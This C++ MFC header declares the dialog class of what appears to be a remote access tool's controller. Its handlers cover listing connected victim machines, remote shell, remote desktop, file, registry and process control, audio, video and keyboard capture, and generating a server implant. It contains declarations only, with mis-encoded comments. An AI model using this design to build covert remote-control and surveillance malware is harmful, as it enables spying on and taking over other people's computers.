// maizangDlg.h : header file
//

#if !defined(AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_)
#define AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_
#include"TrueColorToolBar.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include"TrueColorToolBar.h"
#include<winsock2.h>
#pragma comment(lib,"ws2_32.lib")//�������Ǿ�һ�� �׽��ֵı�дͷ�ļ�����
 
#include "AutoLock.h"
#include "FileManage.h"
/////////////////////////////////////////////////////////////////////////////
// CMaizangDlg dialog

#define  WM_FILEDLGSHOW WM_USER + 0x1110
#define  WM_SCREENDLGSHOW WM_USER + 4000
#define  WM_CMD_DLG_SHOW WM_USER + 912
#define  WM_PROCESS_SHOW WM_USER + 914
#define  WM_WINDOW_MANAGER_DLG_SHOW WM_USER + 1150
typedef struct tagSocketInput
{
	SOCKET sMainConnect;
    SOCKET sHelpConnect;
}SocketInput, *LPSocketInput;
class CMaizangDlg : public CDialog
{
// Construction
public:
	//����������
	void CreatToolBar();

    //����״̬��
	void CreatStatusBar();

	////�����˿ںż���  �������̴߳����������� ��������
    void StartListen(int Port);

	//ֹͣ����
	void StopListen();

	//��Ϣ�б������Ϣ�Ĵ��� ���������������һ��(״̬��)�ĵ�һ���ָ����������Ϣ 
	void ShowMessage(bool bIsOk,CString strMsg); 

	//���������Ŀ
	void AddOnlineList(SOCKET socket, CString strIP,CString strAddr,CString strPCName,CString strOS,CString strCPU,CString strVideo,CString strMemSz); 

    // standard constructor
	CMaizangDlg(CWnd* pParent = NULL);	
  
// Dialog Data
	//{{AFX_DATA(CMaizangDlg)
	enum { IDD = IDD_MAIZANG_DIALOG };
	CListCtrl	m_List_Online;    //�ؼ����� �����ߴ������
	CListCtrl	m_List_Message;   //�ؼ����� ��������Ϣ�������
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMaizangDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;
    CStatusBarCtrl  m_wndStatusBar;
	CTrueColorToolBar m_ToolBar;
	CriticalSection cOnlineLock;


	// Generated message map functions
	//{{AFX_MSG(CMaizangDlg)

	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult);//���һ������б�Ӧ���𵽵ķ�Ӧ
	afx_msg void OnOnlineDelete();//ѡ��ĳ�������Ͽ����Ӻ�Ĵ���
	afx_msg void OnMainClose();//�˵������˳�����ʵ��
	afx_msg void OnMainAbout();//��ʾ���˵��еĹ��ڶԻ���
	afx_msg void OnOnlineAudio();//��������
	afx_msg void OnOnlineCmd();//Զ���ն�
	afx_msg void OnOnlineDesktop();//Զ���������
	afx_msg void OnOnlineFlie();//�ļ�����
	afx_msg void OnOnlineProcess();//���̹���
	afx_msg void OnOnlineRegistry();//ע������
	afx_msg void OnOnlineServer();//�������
	afx_msg void OnOnlineVidio();//��Ƶ����
	afx_msg void OnOnlineWindow();//���ڹ���
	afx_msg void OnCreateServer();//���ɷ����
	//}}AFX_MSG

	// �����ļ����䴰��
    afx_msg LRESULT OnFileDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnScreenDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnCmdDlgShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnProcessShow(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnWindowManagerDlgShow(WPARAM wParam, LPARAM lParam);
	DECLARE_MESSAGE_MAP()
private: 

	//CListCrl����Ϣ�б� �����б� ����Ϣ���Ƶĳ�ʼ�� 
	int InitList();

	//�ͻ��˶��ڷ���˵���Ϣ�Ĵ���     С���Ա�ӿ�
	friend unsigned  __stdcall AcceptSocket(void * pParam);

	//��������������  ���ӷ����  ���׽��ֵĴ�����
	friend unsigned  __stdcall ThreadAccept(void * pParam);

	////���߼���߳�  ������
    friend unsigned  __stdcall ThreadCheck(void * pParam);   
	void openDlg(int cmd);

    int    Online_computer_count;
	HANDLE hCheckThread; 
    SOCKET m_ChoseSocket;
	int m_CurrIndex;
	int     m_ListenPort;   	//�����˿�      
	SOCKET m_ListenSock;
	HANDLE hAcceptThread;//�����̷߳���ֵ
	CString strStatusBar;
 
public:
	afx_msg void OnOnlineKeyboard();
	afx_msg void OnOnlineClassroom();
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAIZANGDLG_H__C18CA6CC_DFC3_48E2_9964_383C64C63ADC__INCLUDED_)



